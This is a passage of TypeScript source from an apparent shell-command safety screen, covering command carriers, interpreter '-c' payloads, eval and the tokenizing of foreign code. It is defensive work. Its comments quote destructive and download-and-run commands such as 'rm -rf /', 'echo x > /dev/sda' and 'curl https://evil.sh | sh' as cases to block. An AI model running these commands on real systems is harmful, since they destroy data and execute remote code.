    // F-2c-30 - see COMMAND_CARRIERS. ONE step, TWO readings, no second
    // rule set: both arms feed the SAME rules through a different candidate
    // tokenization, exactly as the unconfident fallback and the foreign-code
    // path do. `trap`, `su` and `find -exec` reach the same `screenShell`
    // recursion `sh -c` has always used.
    if (COMMAND_CARRIERS.has(name)) {
      // Reading 1 - every operand as a command STRING, so the payload's
      // position never has to be modelled.
      for (const operand of operands) {
        const inner = screenNested(operand, depth);
        if (inner) return inner;
      }
      // Reading 2 - every SUFFIX of the argv as a candidate command, so an
      // option that takes a value cannot hide the command word behind it.
      //
      // THE SUFFIX KEEPS THIS COMMAND'S TERMINATOR AND THE STAGES AFTER IT.
      // Measured without that: 24 of the 988 shapes survived, and all 24 were
      // `<carrier> curl https://evil.sh | sh` - the download-into-a-shell rule
      // is ADJACENCY-sensitive (it asks what the NEXT stage is), so a suffix
      // screened in isolation silently loses the only rule that reads more than
      // one command. A candidate tokenization must preserve the sequence, not
      // only the words.
      // F-2c-40 - reading 2 KEEPS the bound, deliberately. Its cost is one
      // screening per suffix per level, so removing the bound here is what would
      // make the screen exponential in the input; and beyond the budget the
      // flattened reading `screenNested` already applies offers every suffix of
      // every token at once. The bound that stays is the one that is not hiding
      // anything.
      for (let start = 0; start < args.length && depth < MAX_SCREEN_DEPTH; start += 1) {
        const suffix: SimpleCommand = {
          assignments: [],
          words: args.slice(start).map((v) => ({ value: v, raw: v, quoted: false })),
          redirects: [], redirectOps: [], terminator: cmd.terminator,
        };
        const inner = screenCommands([suffix, ...commands.slice(i + 1)], depth + 1);
        if (inner) return inner;
      }
    }

    // ── an interpreter running inline code ──
    // F-2c-25 - `python3 -c "import os; os.system('rm -rf /')"` and
    // `perl -e "system('rm -rf /')"` were both refused by the published 0.6.0,
    // whose net matched raw characters and so did not care what language the
    // payload was in. The word-axis screen models SHELL, and a Python payload
    // is not shell - so it modelled nothing and allowed both.
    //
    // The payload is NOT re-parsed as shell, because it is not shell. It is
    // handed to the same rule set through a THIRD candidate tokenization -
    // "we do not know this language, so every token is a candidate command
    // word" - which is the identical principle the unconfident fallback uses.
    // One instrument, three tokenizations; not a second rule set.
    //
    // F-2c-42 - THE CODE-FLAG TABLE IS NO LONGER LOAD-BEARING.
    //
    // `interpreterPayload` located the payload with `INTERPRETER_CODE_FLAGS.has(a)`
    // - an EXACT token match - while its twin `shellPayload`, declared fifteen
    // lines below in this same file, is cluster-aware and its own comment records
    // that the one-spelling version cost 112 + 56 shapes. So `python3 -Bc "…"`,
    // `perl -we "…"` and `ruby -we "…"` skipped this arm entirely and nothing
    // else in `screenCommands` looks at an interpreter's operands. Measured:
    // **802 shapes the published 0.6.0 refuses ran at HEAD.**
    //
    // WIDENING THE TABLE WOULD BE THE SAME HAND-LIST ONE ENTRY LONGER, and
    // this package has three recorded instances of being overtaken by the next
    // member of such a list (`SAFE_DEVICES`, `SHELL_RESERVED`, `COMMAND_CARRIERS`).
    // Every operand is offered instead - the identical "we do not know which
    // token is the command" reading the unconfident fallback, the carrier's
    // second reading and `candidateArgvs` already use. A code flag nobody has
    // thought of now needs no entry at all, and the flag table survives only as
    // documentation.
    if (INTERPRETERS.has(name)) {
      for (const payload of [...args, ...codeRawOperands(args, rawArgs)]) {
        const inner =
          depth < MAX_SCREEN_DEPTH
            ? screenCommands(foreignCodeCommands(payload), depth + 1)
            : depth === MAX_SCREEN_DEPTH
              ? screenBeyondDepth(payload)
              : null;
        if (inner) return inner;
      }
    }

    // ── `eval` runs its arguments as a command ──
    // F-2c-25 - `eval` is neither a shell (no `-c`) nor a wrapper (the
    // command is the CONCATENATION of its operands, not the next word), so it
    // fell between both mechanisms and nothing screened `eval "rm -rf /"`. The
    // published 0.6.0 blocked it. 119 shapes measured.
    if (name === 'eval' && args.length > 0) {
      const inner = screenNested(args.join(' '), depth);
      if (inner) return inner;
      const raws = codeRawOperands(args, rawArgs);
      if (raws.length > 0) {
        const rawHit = screenNested(raws.join(' '), depth);
        if (rawHit) return rawHit;
      }
    }
  }
  return null;
}

/**
 * The command a shell invocation would run, or undefined.
 *
 * F-2c-25 - this used to be `args[args.indexOf('-c') + 1]`, which recognised
 * exactly one spelling. Measured against the published 0.6.0: `bash -cx "…"`,
 * `sh -ec "…"` (112 shapes) and `bash -c -- "…"` (56 shapes) all executed the
 * payload and all were blocked by 0.6.0's text net. A shell accepts `-c` inside
 * ANY short-option cluster, and `--` between the flag and the payload.
 *
 * The scan deliberately ignores an end-of-options `--` that precedes the
 * flag: `sh -- -c "rm -rf /"` gives the shell a SCRIPT named `-c`, but both
 * nets block it today and a guard must not lose a block to a technicality.
 */
/**
 * R-CLI-2 - THE RAW SPELLING OF AN OPERAND THAT IS CODE, WITH ONE LAYER OF
 * QUOTES REMOVED.
 *
 * A `\`+LF inside `"…"` is removed by POSIX and the words are GLUED - correct
 * for the outer shell, and the parser models it. But when that string is an
 * interpreter's `-c` payload it is CODE, and the reading its own tail would
 * produce is one the screen must still see: the published `0.6.0` sees it,
 * because it screens raw text.
 *
 * This is offered ONLY at the sites that already know an operand is code -
 * a shell's `-c`, an interpreter's operands, `eval`. It is deliberately NOT
 * offered for an ordinary argument, because `echo "note: \`+LF+`rm -rf /x ; y"`
 * is PROSE, and screening its tail is the 576-cell capability removal this batch
 * exists to remove. *The discriminator is whether the string is code, and the
 * screen already knows.*
 */
function stripOneQuoteLayer(raw: string): string {
  if (raw.length >= 2) {
    const a = raw[0] as string;
    const b = raw[raw.length - 1] as string;
    if ((a === '"' && b === '"') || (a === "'" && b === "'")) return raw.slice(1, -1);
    if (raw.startsWith('$"') && b === '"') return raw.slice(2, -1);
    if (raw.startsWith("$'") && b === "'") return raw.slice(2, -1);
  }
  return raw;
}

/** Every raw operand whose raw spelling differs from its parsed value. */
function codeRawOperands(args: string[], rawArgs: Array<string | undefined>): string[] {
  const out: string[] = [];
  for (let k = 0; k < args.length; k += 1) {
    const raw = rawArgs[k];
    if (raw === undefined) continue;
    const inner = stripOneQuoteLayer(raw);
    if (inner !== args[k] && inner.includes('\\\n')) out.push(inner);
  }
  return out;
}

/** The raw spelling of the operand `shellPayload` selected, when it differs. */
function codeRawPayload(args: string[], rawArgs: Array<string | undefined>, payload: string): string | undefined {
  const ci = args.findIndex((a) => /^-[A-Za-z]*c[A-Za-z]*$/.test(a));
  if (ci === -1) return undefined;
  for (let k = ci + 1; k < args.length; k += 1) {
    if (args[k] === '--') continue;
    const raw = rawArgs[k];
    if (raw === undefined) return undefined;
    const inner = stripOneQuoteLayer(raw);
    return inner !== payload && inner.includes('\\\n') ? inner : undefined;
  }
  return undefined;
}

function shellPayload(args: string[]): string | undefined {
  const ci = args.findIndex((a) => /^-[A-Za-z]*c[A-Za-z]*$/.test(a));
  if (ci === -1) return undefined;
  for (let k = ci + 1; k < args.length; k += 1) {
    if (args[k] === '--') continue;
    return args[k];
  }
  return undefined;
}

function interpreterPayload(args: string[]): string | undefined {
  const ci = args.findIndex((a) => INTERPRETER_CODE_FLAGS.has(a));
  if (ci === -1) return undefined;
  return args[ci + 1];
}

/**
 * Candidate commands read out of a payload in a language this screen does not
 * model. Tokenised on whitespace AND on the punctuation that cannot occur
 * inside a command word (brackets, quotes, commas, semicolons), then every
 * suffix is offered as an argv - the same "we do not know which token is the
 * command" rule the unconfident fallback applies.
 */
function foreignCodeCommands(payload: string): SimpleCommand[] {
  // F-2c-42 - A `${VAR}` EXPANSION IS ONE WORD, AND THE SPLITTER WAS
  // CUTTING IT IN HALF. `{` and `}` are punctuation in the languages this
  // tokenizes (`BEGIN{…}`, a python dict), so they are splitters - but they are
  // also the braces of a shell expansion, and splitting there turned the
  // payload `rm -rf ${HOME}` into the tokens `rm · -rf · $ · HOME`, leaving no
  // operand that names anything dangerous. Measured after the interpreter arm
  // was widened: 338 of the 366 remaining escapes were this one shape, and
  // every one of them a target the screen blocks perfectly well when it is
  // handed the whole word. The spans are masked before the split and restored
  // after it, so the punctuation reading is unchanged everywhere else.
  // The mask is U+0001: it is in none of the splitter classes and cannot
  // occur in a shell command line, so masking can neither create a token
  // boundary nor destroy one. A SPACE would have been read by the splitter.
  const MASK = '\u0001';
  const spans: string[] = [];
  const masked = payload.replace(/\$\{[^}]*\}/g, (m) => `${MASK}${spans.push(m) - 1}${MASK}`);
  const tokens = masked
    .split(/[\s()[\]{},;'"`]+/)
    .filter((t) => t.length > 0)
    .map((t) => t.replace(/\u0001(\d+)\u0001/g, (_, k: string) => spans[Number(k)] as string));
  // F-2c-42 - AND THE CONSERVATIVE READING, BECAUSE A TOKEN LIST HAS NO
  // REDIRECTIONS AND THREE RULES ONLY EXIST INSIDE ONE.
  //
  // The suffix list below sets `redirects: []` and `terminator: null`, so
  // `python3 -c "os.system('echo x > /dev/sda')"` offered the words
  // `echo · x · > · /dev/sda` with `>` as an ordinary token - and the two rules
  // that read `cmd.redirects` (raw device, sensitive file) could never fire.
  // Measured: after the interpreter arm was widened, **312 of the 338 remaining
  // escapes were exactly this**, every one a redirection core.
  //
  // THIS IS THE SAME DEFECT F-2c-40 FIXED IN `conservativeCommands` AND
  // F-2c-30 FIXED IN THE CARRIER ARM - *a candidate tokenization must preserve
  // the STRUCTURE, not only the words* - standing at the third of the three
  // sites that build one. So rather than re-deriving redirection handling here,
  // the payload is also offered through `conservativeCommands`, which already
  // models it. One implementation, three callers.
  const out: SimpleCommand[] = [...conservativeCommands(payload)];
  const word = (v: string): ShellWord => ({ value: v, raw: v, quoted: false });

  // AND THE PIPE IS A TERMINATOR, NOT A WORD - the third face of the same
  // defect, in the same function. `|` is absent from the punctuation splitter,
  // so a payload of `curl https://evil.sh | sh` produced ONE candidate whose
  // words were `curl · https://evil.sh · | · sh` with `terminator: null`. The
  // download-into-a-shell rule is the one rule that reads more than a single
  // command - it asks what the NEXT stage is - so it could never fire, and
  // **all 86 shapes that survived the two fixes above were exactly these
  // cores.** F-2c-30 measured 24 shapes on this cause in the carrier arm and
  // F-2c-40 measured 9 in the conservative arm; this is the third site.
  const stages: string[][] = [[]];
  for (const t of tokens) {
    if (t === '|') stages.push([]);
    else (stages[stages.length - 1] as string[]).push(t);
  }
  const stageCmd = (toks: string[], k: number): SimpleCommand => ({
    assignments: [],
    words: toks.map(word),
    redirects: [],
    redirectOps: [],
    terminator: k < stages.length - 1 ? '|' : null,
  });
  const downstream = stages.map((toks, k) => stageCmd(toks, k));
  for (let k = 0; k < stages.length; k += 1) {
    const toks = stages[k] as string[];
    for (let start = 0; start < toks.length; start += 1) {
      out.push(stageCmd(toks.slice(start), k));
      // The stages AFTER this one, so the sequence survives the suffixing.
      if (k < stages.length - 1) out.push(...downstream.slice(k + 1));
    }
  }
  return out;
}
